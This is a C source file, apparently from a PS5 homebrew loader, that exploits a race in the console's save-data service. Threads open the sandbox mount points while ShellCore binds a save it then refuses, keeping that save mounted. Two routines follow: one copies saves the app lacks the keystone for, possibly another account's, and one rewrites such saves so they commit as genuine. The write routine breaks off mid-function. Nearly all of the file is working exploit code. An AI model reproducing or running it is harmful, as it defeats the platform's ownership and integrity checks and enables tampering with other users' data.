/*
 * Read-only copies of saves the save service mounts and then refuses.
 *
 * Measured on a 13.60 PS5 (research/apollo, savedata-reach; static-re for
 * 12.50's SceShellCore): for a mount request ShellCore decrypts and mounts
 * the save, binds it into the app's sandbox as /savedataN, and only then
 * checks its keystone and owner.  When a check fails it unbinds it without
 * force; if a file of the save is open at that moment the unbind fails
 * (EBUSY) and the save stays bound, readable through the descriptors that
 * were opened while it was there.  So a game can read a save of its user
 * whose title's keystone it lacks (and perhaps another account's).  It cannot
 * write one: the mount is left behind, never committed, until SWRR restarts.
 *
 * save_race_copy asks for such a mount with sceSaveDataMountInternal (a
 * title ID and no fingerprint) while threads keep opening the free
 * /savedataN points.  The first racer that opens the save's root holds
 * its sce_sys/param.sfo (only the bound save has one, and while it is open
 * the save cannot be unbound) and opens every file below it at once, by
 * absolute path, while the save is bound.  (On the 13.60 PS5 the names keep
 * resolving after the refusal for as long as something holds the save; an
 * earlier reading that they stop was descriptors leaking to EMFILE.  Opening
 * everything in the window costs nothing and covers a console that differs.)
 * SWRR may not use dir-relative calls at all (openat: EPERM, the other *at
 * calls: ENOSYS); getdents on a held directory works.  A directory caught
 * first can be the bare mount point the save then covers, which stays empty:
 * the root is listed through a descriptor opened by path after the pin.  Then the save is copied through
 * them into a directory, the copy made read-only, and they are closed.  The mount point it leaves behind is counted
 * against ghostldr's mount slots; RACE_MAX copies per SWRR session at most.
 */
#include "kmod.h"
#include "savedata_hooks.h"
#include "sys_title.h"

#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 0x200
#define O_TRUNC 0x400
#define O_DIRECTORY 0x20000
#define RACE_MAX 6
#define RACERS 3
#define MAXFD 48
#define MAXPIN 256 /* files of a save opened while it is bound */

/* the save's files, opened by the racer that got its root first */
struct pin {
    int fd;
    char rel[124]; /* below the save's root */
};
static struct pin *g_pin; /* page_alloc'd, MAXPIN */
static volatile int g_npin, g_pinning;

static struct {
    s32 (*open)(const char *, int, int);
    s32 (*openat)(int, const char *, int, int);
    s32 (*close)(int);
    s64 (*read)(int, void *, u64);
    s64 (*write)(int, const void *, u64);
    s32 (*mkdir)(const char *, int);
    s32 (*getdents)(int, void *, int);
    s32 (*stat)(const char *, void *);
    s32 (*chmod)(const char *, int);
    s32 (*unlink)(const char *);
    s32 (*rmdir)(const char *);
    s32 (*yield)(void);
    s32 (*mount_internal)(const void *, void *, const void *);
    s32 (*umount)(const char *);
    s32 (*thread)(void *, const void *, void *(*)(void *), void *, const char *);
    s32 (*join)(u64, void **);
} R;

static bool race_ready(void)
{
    if (!R.open) {
        R.openat = host_real("openat");
        R.close = host_real("close");
        R.read = host_real("read");
        R.write = host_real("write");
        R.mkdir = host_real("mkdir");
        R.getdents = host_real("getdents");
        R.stat = host_real("stat");
        R.chmod = host_real("chmod");
        R.unlink = host_real("unlink");
        R.rmdir = host_real("rmdir");
        R.yield = host_real("sched_yield");
        R.mount_internal = host_real_in("libSceSaveData", "sceSaveDataMountInternal");
        R.umount = host_real_in("libSceSaveData", "sceSaveDataUmount");
        R.thread = host_real("scePthreadCreate");
        R.join = host_real("scePthreadJoin");
        R.open = host_real("open");
    }
    return R.open && R.openat && R.close && R.read && R.write && R.mkdir && R.getdents && R.stat && R.chmod &&
           R.unlink && R.rmdir && R.yield && R.mount_internal && R.umount && R.thread && R.join;
}

/* sceKernelGetProcessTime (us), or 0 if the host can't give it (the tests) */
static u64 now_us(void)
{
    static u64 (*pt)(void);
    static int tried;
    if (!tried) {
        tried = 1;
        pt = host_real("sceKernelGetProcessTime");
    }
    return pt ? pt() : 0;
}

static struct {
    volatile int go, stop;
    volatile int n;
    int fd[MAXFD];
    u8 slot[MAXFD];
    bool dir[MAXFD];
    u32 free_mask;
    volatile u64 tries;
    volatile u64 first_us; /* us when a racer first held something */
} G_r;

/* every file below the held directory dirfd (rel below /savedata<slot>), opened by absolute path */
static void pin_tree(int dirfd, u32 slot, const char *rel, int depth)
{
    u8 dents[4096];
    int got;
    while ((got = R.getdents(dirfd, dents, sizeof(dents))) > 0)
        for (int off = 0; off + 8 <= got;) {
            u16 reclen = *(u16 *)(dents + off + 4);
            u8 type = dents[off + 6], nlen = dents[off + 7];
            char name[256], sub[124], abs[160];
            if (!reclen)
                break;
            memcpy(name, dents + off + 8, nlen);
            name[nlen] = 0;
            off += reclen;
            if ((nlen == 1 && name[0] == '.') || (nlen == 2 && name[0] == '.' && name[1] == '.'))
                continue;
            fmt(sub, sizeof(sub), "%s%s%s", rel, rel[0] ? "/" : "", name);
            fmt(abs, sizeof(abs), "/savedata%u/%s", slot, sub);
            int fd = R.open(abs, type == 4 ? O_RDONLY | O_DIRECTORY : O_RDONLY, 0);
            if (fd < 0)
                continue; /* sce_sys/keystone: no app may read it */
            if (type == 4 && depth > 0) {
                pin_tree(fd, slot, sub, depth - 1);
                R.close(fd);
            } else if (type == 8 && g_npin < MAXPIN) {
                g_pin[g_npin].fd = fd;
                strlcpy(g_pin[g_npin].rel, sub, sizeof(g_pin[g_npin].rel));
                g_npin++;
            } else
                R.close(fd);
        }
}

/* a racer caught something on /savedata<slot> (a directory or the save's
 * sce_sys/param.sfo): if the save's files show there, hold its param.sfo and
 * open its files now.  The save's root is listed through a descriptor opened
 * for that, by path, after the pin: a directory caught a moment before can be
 * the bare mount point the save then covers, which stays empty (13.60 PS5:
 * caught 21-103 ms after the request, listing only . and ..). */
static void pin_save(u32 slot)
{
    int no = 0;
    if (!g_pin || !__atomic_compare_exchange_n(&g_pinning, &no, 1, false, __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE))
        return;
    char p[48];
    fmt(p, sizeof(p), "/savedata%u/sce_sys/param.sfo", slot);
    int sfo = R.open(p, O_RDONLY, 0);
    if (sfo < 0) {
        __atomic_store_n(&g_pinning, 0, __ATOMIC_RELEASE);
        return;
    }
    fmt(p, sizeof(p), "/savedata%u", slot);
    int root = R.open(p, O_RDONLY | O_DIRECTORY, 0);
    if (root >= 0) {
        pin_tree(root, slot, "", 6);
        R.close(root);
    }
    R.close(sfo); /* sce_sys/param.sfo itself was opened again by pin_tree, if readable */
    __atomic_store_n(&g_pinning, g_npin > 0 ? 2 : 0, __ATOMIC_RELEASE); /* nothing pinned: let a later catch try */
}

/* Each racer keeps at most one directory and one file descriptor per slot it
 * caught (the directory keeps the bare mount point, and then the save, from
 * being unbound; the file is the save's own); everything else it opens is
 * closed at once, so a race holds a handful of descriptors, not hundreds. */
static void *racer(void *arg)
{
    u64 id = (u64)arg, tries = 0;
    int held[2][2] = {{-1, -1}, {-1, -1}}; /* [slot index][0 directory, 1 file] */
    u32 slots[2] = {0, 0}, ns = 0;
    for (u32 n = 0; n < 16 && ns < 2; n++)
        if (G_r.free_mask & (1u << n))
            slots[ns++] = n;
    while (!G_r.go && !G_r.stop)
        R.yield();
    while (!G_r.stop) {
        for (u32 i = 0; i < ns && !G_r.stop; i++) {
            u32 n = slots[i];
            char p[40];
            bool dir = ((tries + id) & 1) == 0;
            fmt(p, sizeof(p), dir ? "/savedata%u" : "/savedata%u/sce_sys/param.sfo", n);
            int fd = R.open(p, dir ? O_DIRECTORY : O_RDONLY, 0);
            tries++;
            if (fd >= 0) {
                if (!G_r.first_us)
                    G_r.first_us = now_us();
                if (__atomic_load_n(&g_pinning, __ATOMIC_ACQUIRE) != 2)
                    pin_save(n);
                if (held[i][dir ? 0 : 1] < 0)
                    held[i][dir ? 0 : 1] = fd;
                else
                    R.close(fd);
            }
            R.yield();
        }
    }
    for (u32 i = 0; i < ns; i++)
        for (u32 j = 0; j < 2; j++)
            if (held[i][j] >= 0) {
                int k = __atomic_fetch_add(&G_r.n, 1, __ATOMIC_ACQ_REL);
                if (k < MAXFD)
                    G_r.fd[k] = held[i][j], G_r.slot[k] = (u8)slots[i], G_r.dir[k] = j == 0;
                else
                    R.close(held[i][j]);
            }
    __atomic_fetch_add(&G_r.tries, tries, __ATOMIC_RELAXED);
    return NULL;
}

/* ---- the copy ---- */

static u8 *g_buf;
#define BUF (1u << 20)

static s64 copy_file(int src, const char *dst, u64 *bytes)
{
    int out = R.open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0)
        return -1;
    s64 total = 0, n;
    while ((n = R.read(src, g_buf, BUF)) > 0) {
        if (R.write(out, g_buf, (u64)n) != n) {
            total = -1;
            break;
        }
        total += n;
    }
    R.close(out);
    if (n < 0)
        total = -1;
    if (total > 0)
        *bytes += (u64)total;
    return total;
}

/* every file below dirfd into dst (a directory that exists); depth-limited */
static void copy_tree(int dirfd, const char *dst, int depth, u32 *files, u32 *refused, u64 *bytes)
{
    u8 *dents = page_alloc(16384);
    if (!dents)
        return;
    int got;
    while ((got = R.getdents(dirfd, dents, 16384)) > 0)
        for (int off = 0; off + 8 <= got;) {
            u16 reclen = *(u16 *)(dents + off + 4);
            u8 type = dents[off + 6], nlen = dents[off + 7];
            char name[256];
            if (!reclen)
                break;
            memcpy(name, dents + off + 8, nlen);
            name[nlen] = 0;
            off += reclen;
            if ((nlen == 1 && name[0] == '.') || (nlen == 2 && name[0] == '.' && name[1] == '.'))
                continue;
            char out[512];
            fmt(out, sizeof(out), "%s/%s", dst, name);
            if (type == 4 && depth > 0) {
                int sub = R.openat(dirfd, name, O_RDONLY | O_DIRECTORY, 0);
                if (sub < 0) {
                    (*refused)++;
                    continue;
                }
                R.mkdir(out, 0755);
                copy_tree(sub, out, depth - 1, files, refused, bytes);
                R.close(sub);
                R.chmod(out, 0555);
            } else if (type == 8) {
                int f = R.openat(dirfd, name, O_RDONLY, 0);
                if (f < 0 || copy_file(f, out, bytes) < 0) {
                    (*refused)++; /* sce_sys/keystone: no app may read it */
                    if (f >= 0)
                        R.close(f);
                    continue;
                }
                R.close(f);
                R.chmod(out, 0444);
                (*files)++;
            }
        }
    page_free(dents, 16384);
}

/* an earlier copy at path (made read-only): gone */
static void remove_tree(const char *path, int depth)
{
    R.chmod(path, 0755);
    int fd = R.open(path, O_DIRECTORY, 0);
    if (fd < 0) {
        R.unlink(path);
        return;
    }
    u8 *dents = page_alloc(16384);
    int got;
    while (dents && (got = R.getdents(fd, dents, 16384)) > 0)
        for (int off = 0; off + 8 <= got;) {
            u16 reclen = *(u16 *)(dents + off + 4);
            u8 type = dents[off + 6], nlen = dents[off + 7];
            if (!reclen)
                break;
            char name[256], sub[512];
            memcpy(name, dents + off + 8, nlen);
            name[nlen] = 0;
            off += reclen;
            if ((nlen == 1 && name[0] == '.') || (nlen == 2 && name[0] == '.' && name[1] == '.'))
                continue;
            fmt(sub, sizeof(sub), "%s/%s", path, name);
            if (type == 4 && depth > 0)
                remove_tree(sub, depth - 1);
            else
                R.chmod(sub, 0644), R.unlink(sub);
        }
    if (dents)
        page_free(dents, 16384);
    R.close(fd);
    R.rmdir(path);
}

static void mkdirs(const char *path)
{
    char p[512];
    strlcpy(p, path, sizeof(p));
    for (char *c = p + 1; *c; c++)
        if (*c == '/') {
            *c = 0;
            R.mkdir(p, 0755);
            *c = '/';
        }
    R.mkdir(p, 0755);
}

static u32 g_races;
static volatile int g_lock;

static bool rw_ready(void);
static s32 fp_mount(s32 user, const char *t, const char *d, const char *fp, char mp[16]);

/* fp: NULL, or the title's keystone fingerprint, which asks for the mount with
 * sceSaveDataMount instead (the same refusal for another account's save, by
 * another branch of the service) */
static s32 race_copy(s32 user, const char *tid, const char *dir, const char *dst, const char *fp)
{
    if (fp && (!fp[0] || !rw_ready()))
        fp = NULL;
    if (!race_ready()) {
        logf("save_race: libkernel or libSceSaveData lacks what it needs");
        return E_INVAL;
    }
    spin_lock(&g_lock);
    if (g_races >= RACE_MAX) {
        spin_unlock(&g_lock);
        logf("save_race: %u saves copied this session already (each leaves a mount behind until SWRR restarts)",
             g_races);
        return (s32)0x809F000C; /* MOUNT_FULL */
    }
    if ((!g_buf && !(g_buf = page_alloc(BUF))) || (!g_pin && !(g_pin = page_alloc(sizeof(*g_pin) * MAXPIN)))) {
        spin_unlock(&g_lock);
        return E_NOMEM;
    }
    memset(&G_r, 0, sizeof(G_r));
    g_npin = 0, g_pinning = 0;
    u8 st[0x78];
    for (u32 n = 0; n < 16; n++) {
        char p[16];
        fmt(p, sizeof(p), "/savedata%u", n);
        if (R.stat(p, st) != 0)
            G_r.free_mask |= 1u << n;
    }
    /* ShellCore takes the lowest free mount points: race on the first two */
    u32 keep = 0, k2 = 0;
    for (u32 n = 0; n < 16 && k2 < 2; n++)
        if (G_r.free_mask & (1u << n))
            keep |= 1u << n, k2++;
    G_r.free_mask = keep;
    if (!keep || gfs_slot_reserve() != 0) {
        spin_unlock(&g_lock);
        return (s32)0x809F000C;
    }
    u64 th[RACERS];
    u32 started = 0;
    for (u32 i = 0; i < RACERS; i++)
        if (R.thread(&th[i], NULL, racer, (void *)(u64)i, "ghostldr_race") == 0)
            started++;
    K.usleep(20000);
    char t[16], d[32];
    memset(t, 0, sizeof(t)), memset(d, 0, sizeof(d));
    strlcpy(t, tid, 10);
    strlcpy(d, dir, sizeof(d));
    struct {
        s32 user;
        u32 pad;
        const char *title, *dir;
        const void *fp;
        u64 blocks;
        u32 mode;
        u8 reserved[32];
    } m;
    memset(&m, 0, sizeof(m));
    m.user = user, m.title = t, m.dir = d, m.mode = 1; /* RDONLY */
    u8 res[0x40];
    memset(res, 0, sizeof(res));
    G_r.go = 1;
    K.usleep(2000);
    u64 t0 = now_us();
    s32 rc = fp ? fp_mount(user, t, d, fp, (char *)res) : R.mount_internal(&m, res, NULL);
    u64 t1 = now_us();
    K.usleep(200000);
    G_r.stop = 1;
    for (u32 i = 0; i < started; i++)
        R.join(th[i], NULL);
    s32 nfd = G_r.n < MAXFD ? G_r.n : MAXFD;
    /* the save's root: a directory descriptor whose listing has sce_sys */
    int root = -1;
    u32 slot = 0;
    for (s32 i = 0; i < nfd && root < 0; i++)
        if (G_r.dir[i]) {
            int s = R.openat(G_r.fd[i], "sce_sys", O_RDONLY | O_DIRECTORY, 0);
            if (s >= 0)
                R.close(s), root = G_r.fd[i], slot = G_r.slot[i];
        }
    u32 files = 0, refused = 0;
    u64 bytes = 0;
    if (root < 0 && nfd > 0)
        slot = G_r.slot[0]; /* only files held: the mount may still be bound */
    if (g_npin > 0) { /* the files opened while the save was bound */
        remove_tree(dst, 8);
        mkdirs(dst);
        for (int i = 0; i < g_npin; i++) {
            char out[512], d[512];
            fmt(out, sizeof(out), "%s/%s", dst, g_pin[i].rel);
            strlcpy(d, out, sizeof(d));
            char *cut = (char *)strrchr_c(d, '/');
            if (cut)
                *cut = 0, mkdirs(d);
            if (copy_file(g_pin[i].fd, out, &bytes) >= 0)
                R.chmod(out, 0444), files++;
            else
                refused++;
            R.close(g_pin[i].fd);
        }
        R.chmod(dst, 0555);
        if (root < 0)
            root = -2; /* copied: no root descriptor needed */
    } else if (root >= 0) {
        remove_tree(dst, 8);
        mkdirs(dst);
        copy_tree(root, dst, 6, &files, &refused, &bytes);
        R.chmod(dst, 0555);
    }
    for (s32 i = 0; i < nfd; i++)
        R.close(G_r.fd[i]);
    char mp[16];
    memset(mp, 0, sizeof(mp));
    fmt(mp, sizeof(mp), "/savedata%u", slot);
    s32 um = rc == 0 ? R.umount((const char *)res) : nfd > 0 ? R.umount(mp) : 0;
    bool left = nfd > 0 && rc != 0 && um != 0;
    if (!left)
        gfs_slot_release();
    if (root != -1)
        g_races++;
    spin_unlock(&g_lock);
    logf("save_race: %s:%s: mount -> %x (%s), %lu opens, %d descriptors; copied %u files (%lu bytes) to %s, %u "
         "refused; unmount -> %x%s",
         t, d, (u32)rc, rc == 0 ? "allowed" : "refused after binding", G_r.tries, nfd, files, bytes, dst, refused,
         (u32)um, left ? ": the mount point stays until SWRR restarts" : "");
    logf("save_race: %s:%s: %s took %lu us; first descriptor %s%ld us after the request; %d files held",
         t, d, fp ? "the fingerprint mount" : "MountInternal", (u64)(t1 - t0),
         G_r.first_us ? "" : "never (", G_r.first_us ? (long)(G_r.first_us - t0) : 0L, g_npin);
    return root != -1 ? 0 : rc ? rc : E_NOENT;
}

s32 save_race_copy(s32 user, const char *tid, const char *dir, const char *dst)
{
    return race_copy(user, tid, dir, dst, NULL);
}


/* ======================================================================
 * Writing a save the service refuses to mount read-write: the resign
 * without a jailbreak.
 *
 * Measured on a 13.60 PS5 (research/apollo, savedata-reach C1-RW) and a 12.50
 * PS4 (ps4-reference E1): asked for an RDWR|DESTRUCT_OFF mount of a save whose
 * keystone is not SWRR's, ShellCore decrypts it, mounts it read-write and
 * binds it as /savedataN, then refuses (0x809F000F).  Descriptors opened
 * inside it during that window keep the bind alive (the cleanup unmount fails
 * EBUSY), writes through them land in the mounted save, and when SWRR closes
 * the system's forced unmount commits them to the save image.  The save keeps
 * its sce_sys (its owner's account ID, the game's keystone), so the game
 * loads what was written as its own.
 *
 * SWRR can't name anything relative to a descriptor (on the 13.60 PS5:
 * openat EPERM; mkdirat, unlinkat, fstatat, renameat ENOSYS), and once the
 * mount is refused a path into it no longer resolves (0x80020018).  So all
 * that needs a path happens inside the window, in the racing threads: first
 * a pin (sce_sys/param.sfo, which only the bound save has; while it is open
 * the save can't be unbound, so later paths are the save's), then the
 * source's folders and files (missing ones made), then, once every one of
 * them is held, what the source lacks is removed.  After the refusal the
 * bytes go through the held descriptors.
 *
 * save_race_write: the save's files become those of src (a host folder):
 * files rewritten (grown or shrunk), new files and folders made, and files
 * and folders the source lacks removed: that only when the save's present
 * tree was read first, read-only with the title's keystone fingerprint, and
 * backed up.  sce_sys is never touched.  Everything is read back and
 * compared, the descriptors are closed, and the save stays mounted until
 * SWRR closes, which commits it.
 * ====================================================================== */

#define O_RDWR 2
#define O_EXCL 0x800
#define ENOENT_ 2
#define RW_SLOTS 2
#define RW_MAXP 192
#define RW_RACERS 4
#define SRC_MAX 512
#define LIST_MAX 96

static struct {
    s32 (*ftruncate)(int, s64);
    s32 (*fsync)(int);
    s64 (*pwrite)(int, const void *, u64, s64);
    s64 (*pread)(int, void *, u64, s64);
    s32 (*fstat)(int, void *);
    s32 (*mount)(const void *, void *);
    s64 (*lseek)(int, s64, int);
    int *(*err)(void);
} W;

static bool rw_ready(void)
{
    if (!race_ready())
        return false;
    if (!W.pread) {
        W.ftruncate = host_real("ftruncate");
        W.fsync = host_real("fsync");
        W.pwrite = host_real("pwrite");
        W.fstat = host_real("fstat");
        W.mount = host_real_in("libSceSaveData", "sceSaveDataMount");
        W.err = host_real("__error");
        W.lseek = host_real("lseek");
        W.pread = host_real("pread");
    }
    return W.ftruncate && W.fsync && W.pwrite && W.pread && W.fstat && W.lseek && W.err;
}

static int rw_errno(void) { return W.err ? *W.err() : 0; }

/* the paths raced: [0] the save's root, [1] the pin (sce_sys/param.sfo), then the source's folders and files
 * (src) and what only the save has (listed: from the read-only listing) */
struct rw_path {
    char rel[200];
    bool dir, src, listed;
    volatile int fd[RW_SLOTS];
    volatile u8 made[RW_SLOTS], gone[RW_SLOTS];
};

static struct {
    struct rw_path *p; /* allocated once: a racer parked in an open may still write here */
    volatile u32 n;
    u32 slot[RW_SLOTS];
    u32 nslots;
    bool prune; /* the save's tree was listed (and backed up): what the source lacks may go */
    const struct rw_path *clash;
    volatile int go, stop, done;
    volatile int pruned[RW_SLOTS];
    volatile u64 tries;
} G_w;

static void rw_path_of(char *out, size_t size, u32 s, const struct rw_path *p)
{
    fmt(out, size, p->rel[0] ? "/savedata%u/%s" : "/savedata%u", G_w.slot[s], p->rel);
}

/* one open of path i in slot s (pinned: the bound save is there and stays), made when missing */
static int rw_open(u32 s, u32 i)
{
    struct rw_path *p = &G_w.p[i];
    char path[240];
    rw_path_of(path, sizeof(path), s, p);
    if (i == 1)
        return R.open(path, O_RDONLY, 0);
    if (p->dir) {
        int fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
        if (fd < 0 && i > 1 && !p->listed && rw_errno() == ENOENT_ && R.mkdir(path, 0777) == 0) {
            p->made[s] = 1;
            fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
        }
        return fd;
    }
    int fd = R.open(path, O_RDWR, 0);
    if (fd < 0 && !p->listed && rw_errno() == ENOENT_) {
        fd = R.open(path, O_RDWR | O_CREAT | O_EXCL, 0666);
        if (fd >= 0)
            p->made[s] = 1;
    }
    return fd;
}

/* whether the pin and every source path are held in slot s */
static bool rw_all_held(u32 s, u32 n)
{
    for (u32 i = 1; i < n; i++)
        if ((i == 1 || G_w.p[i].src) && G_w.p[i].fd[s] < 0)
            return false;
    return true;
}

static bool in_sce_sys(const char *rel) { return strncmp(rel, "sce_sys", 7) == 0 && (!rel[7] || rel[7] == '/'); }

/* what only the save has, deepest first (the listing is parents first) */
static void rw_prune(u32 s, u32 n)
{
    for (u32 i = n; i-- > 2;) {
        struct rw_path *p = &G_w.p[i];
        if (p->src || !p->listed || p->gone[s] || in_sce_sys(p->rel))
            continue;
        char path[240];
        rw_path_of(path, sizeof(path), s, p);
        if ((p->dir ? R.rmdir(path) : R.unlink(path)) == 0)
            p->gone[s] = 1;
    }
}

static void *rw_racer(void *arg)
{
    u64 id = (u64)arg, tries = 0;
    while (!G_w.go && !G_w.stop)
        R.yield();
    while (!G_w.stop) {
        u32 n = G_w.n;
        for (u32 s = 0; s < G_w.nslots && !G_w.stop; s++) {
            if (G_w.p[1].fd[s] < 0) {
                int fd = rw_open(s, 1);
                tries++;
                if (fd >= 0 && !__sync_bool_compare_and_swap(&G_w.p[1].fd[s], -1, fd))
                    R.close(fd);
                continue;
            }
            for (u32 k = 0; k < n && !G_w.stop; k++) {
                u32 i = (u32)((k + id * 7) % n);
                struct rw_path *p = &G_w.p[i];
                if (i == 1 || p->fd[s] >= 0 || (i > 1 && !p->src))
                    continue;
                int fd = rw_open(s, i);
                tries++;
                if (fd >= 0 && !__sync_bool_compare_and_swap(&p->fd[s], -1, fd))
                    R.close(fd);
            }
            if (G_w.prune && !G_w.pruned[s] && rw_all_held(s, n) &&
                __sync_bool_compare_and_swap(&G_w.pruned[s], 0, 1))
                rw_prune(s, n);
        }
        R.yield();
    }
    __atomic_fetch_add(&G_w.tries, tries, __ATOMIC_RELAXED);
    __atomic_fetch_add(&G_w.done, 1, __ATOMIC_RELEASE);
    return NULL;
}

static bool skip_name(const char *name, u32 nlen)
{
    return (nlen == 1 && name[0] == '.') || (nlen == 2 && name[0] == '.' && name[1] == '.');
}

/* "rel/name", or "name" at the top */
static void join(char *out, size_t size, const char *rel, const char *name)
{
    if (rel[0])
        fmt(out, size, "%s/%s", rel, name);
    else
        strlcpy(out, name, size);
}

static struct rw_path *find_path(const char *rel)
{
    for (u32 i = 0; i < G_w.n; i++)
        if (strcmp(G_w.p[i].rel, rel) == 0)
            return &G_w.p[i];
    return NULL;
}

static struct rw_path *add_path(const char *rel, bool dir, bool src)
{
    struct rw_path *p = find_path(rel);
    if (p || G_w.n >= RW_MAXP)
        return p;
    p = &G_w.p[G_w.n];
    memset(p, 0, sizeof(*p));
    strlcpy(p->rel, rel, sizeof(p->rel));
    p->dir = dir, p->src = src;
    for (u32 s = 0; s < RW_SLOTS; s++)
        p->fd[s] = -1;
    __atomic_store_n(&G_w.n, G_w.n + 1, __ATOMIC_RELEASE);
    return p;
}

static void rw_reset(void)
{
    struct rw_path *keep = G_w.p;
    memset(&G_w, 0, sizeof(G_w));
    G_w.p = keep;
}

/* ---- the source: every folder and file below a host folder, parents first, sce_sys at the top left out ---- */

struct rw_src {
    char rel[200];
    bool dir;
    u64 size;
};

static s32 src_walk(const char *root, const char *rel, int depth, struct rw_src *out, u32 *n)
{
    char path[512];
    fmt(path, sizeof(path), rel[0] ? "%s/%s" : "%s", root, rel);
    int fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0)
        return E_NOENT;
    u8 *dents = page_alloc(16384);
    s32 rc = dents ? 0 : E_NOMEM;
    int got;
    while (rc == 0 && (got = R.getdents(fd, dents, 16384)) > 0)
        for (int off = 0; off + 8 <= got && rc == 0;) {
            u16 reclen = *(u16 *)(dents + off + 4);
            u8 type = dents[off + 6], nlen = dents[off + 7];
            char name[256];
            if (!reclen)
                break;
            memcpy(name, dents + off + 8, nlen);
            name[nlen] = 0;
            off += reclen;
            if (skip_name(name, nlen) || (!rel[0] && strcmp(name, "sce_sys") == 0))
                continue;
            if (*n >= SRC_MAX) {
                rc = E_NOMEM;
                break;
            }
            struct rw_src *e = &out[(*n)++];
            join(e->rel, sizeof(e->rel), rel, name);
            e->dir = type == 4;
            e->size = 0;
            if (e->dir) {
                rc = depth > 0 ? src_walk(root, e->rel, depth - 1, out, n) : E_INVAL;
            } else if (type == 8) {
                u8 st[0x78];
                fmt(path, sizeof(path), "%s/%s", root, e->rel);
                if (R.stat(path, st) != 0)
                    rc = E_NOENT;
                else
                    e->size = *(u64 *)(st + 0x48);
            } else {
                rc = E_INVAL; /* links and devices: not save files */
            }
        }
    if (dents)
        page_free(dents, 16384);
    R.close(fd);
    return rc;
}

static bool in_source(const struct rw_src *src, u32 n, const char *rel)
{
    for (u32 i = 0; i < n; i++)
        if (strcmp(src[i].rel, rel) == 0)
            return true;
    return false;
}

/* one listing of a folder: up to LIST_MAX names (the listing is taken whole before anything is removed) */
struct rw_list {
    u32 n;
    u8 type[LIST_MAX];
    char name[LIST_MAX][128];
};

static void list_dir(int dirfd, struct rw_list *l)
{
    l->n = 0;
    W.lseek(dirfd, 0, 0); /* a folder listed before reads from its start again */
    u8 *dents = page_alloc(16384);
    int got;
    while (dents && (got = R.getdents(dirfd, dents, 16384)) > 0)
        for (int off = 0; off + 8 <= got;) {
            u16 reclen = *(u16 *)(dents + off + 4);
            u8 type = dents[off + 6], nlen = dents[off + 7];
            const char *name = (const char *)dents + off + 8;
            if (!reclen)
                break;
            off += reclen;
            if (skip_name(name, nlen) || nlen >= 128 || l->n >= LIST_MAX)
                continue;
            memcpy(l->name[l->n], name, nlen);
            l->name[l->n][nlen] = 0;
            l->type[l->n++] = type;
        }
    if (dents)
        page_free(dents, 16384);
}

/* ---- the save's present tree, read-only with its fingerprint (when known), by path ---- */

/* every entry below mp/rel (sce_sys at the top left out) into the table, parents first; false when the listing
 * was cut short (too many entries or too deep) */
static bool tgt_walk(const char *mp, const char *rel, int depth)
{
    char path[240];
    fmt(path, sizeof(path), rel[0] ? "%s/%s" : "%s", mp, rel);
    int fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
    struct rw_list *l = fd >= 0 ? page_alloc(sizeof(*l)) : NULL;
    if (!l) {
        if (fd >= 0)
            R.close(fd);
        return false;
    }
    list_dir(fd, l);
    R.close(fd);
    bool whole = l->n < LIST_MAX;
    for (u32 i = 0; i < l->n; i++) {
        if (!rel[0] && strcmp(l->name[i], "sce_sys") == 0)
            continue;
        char sub[200];
        join(sub, sizeof(sub), rel, l->name[i]);
        bool dir = l->type[i] == 4;
        struct rw_path *p = add_path(sub, dir, false);
        if (!p) {
            whole = false;
            continue;
        }
        p->listed = true;
        if (p->dir != dir && !G_w.clash)
            G_w.clash = p; /* a folder in one, a file in the other */
        if (dir)
            whole = (depth > 0 && tgt_walk(mp, sub, depth - 1)) && whole;
    }
    page_free(l, sizeof(*l));
    return whole;
}

/* the files below the host folder src copied into the host folder dst, by path (sce_sys too, as far as the app
 * may read it: its keystone it may not); the number that could not be copied, sce_sys's left out */
static u32 plain_copy(const char *src, const char *dst, const char *rel, int depth)
{
    char path[512], out[512];
    fmt(path, sizeof(path), rel[0] ? "%s/%s" : "%s", src, rel);
    fmt(out, sizeof(out), rel[0] ? "%s/%s" : "%s", dst, rel);
    int fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
    struct rw_list *l = fd >= 0 ? page_alloc(sizeof(*l)) : NULL;
    if (!l) {
        if (fd >= 0)
            R.close(fd);
        return 1;
    }
    list_dir(fd, l);
    R.close(fd);
    R.mkdir(out, 0777);
    u32 bad = l->n >= LIST_MAX;
    for (u32 i = 0; i < l->n; i++) {
        char sub[200];
        join(sub, sizeof(sub), rel, l->name[i]);
        if (l->type[i] == 4) {
            bad += depth > 0 ? plain_copy(src, dst, sub, depth - 1) : 1;
            continue;
        }
        fmt(path, sizeof(path), "%s/%s", src, sub);
        fmt(out, sizeof(out), "%s/%s", dst, sub);
        int f = R.open(path, O_RDONLY, 0);
        int o = f >= 0 ? R.open(out, O_WRONLY | O_CREAT | O_TRUNC, 0666) : -1;
        s64 n = 0;
        while (o >= 0 && (n = R.read(f, g_buf, BUF)) > 0)
            if (R.write(o, g_buf, (u64)n) != n) {
                n = -1;
                break;
            }
        if (o < 0 || n < 0)
            bad += !in_sce_sys(sub); /* sce_sys/keystone: no app may read it */
        if (o >= 0)
            R.close(o);
        if (f >= 0)
            R.close(f);
    }
    page_free(l, sizeof(*l));
    return bad;
}

/* SceSaveDataMount (v1) */
struct rw_mount1 {
    s32 user;
    u32 pad;
    const char *title, *dir;
    const void *fp;
    u64 blocks;
    u32 mode;
    u8 reserved[36];
};

static s32 fp_mount(s32 user, const char *t, const char *d, const char *fp, char mp[16])
{
    if (!W.mount || !fp || strlen(fp) != 64)
        return E_INVAL;
    struct {
        char data[65];
        char pad[15];
    } f;
    memset(&f, 0, sizeof(f));
    strlcpy(f.data, fp, sizeof(f.data));
    struct rw_mount1 m;
    memset(&m, 0, sizeof(m));
    m.user = user, m.title = t, m.dir = d, m.fp = &f, m.mode = 1; /* RDONLY */
    u8 res[0x40];
    memset(res, 0, sizeof(res));
    s32 rc = W.mount(&m, res);
    if (rc == 0)
        memcpy(mp, res, 16);
    return rc;
}

/* ---- the write, through the held descriptors ---- */

static void note(struct save_race_result *r, const char *what, const char *rel)
{
    int e = rw_errno();
    logf("save_race: write: %s %s failed (errno %d)", what, rel, e);
    if (!r->why[0])
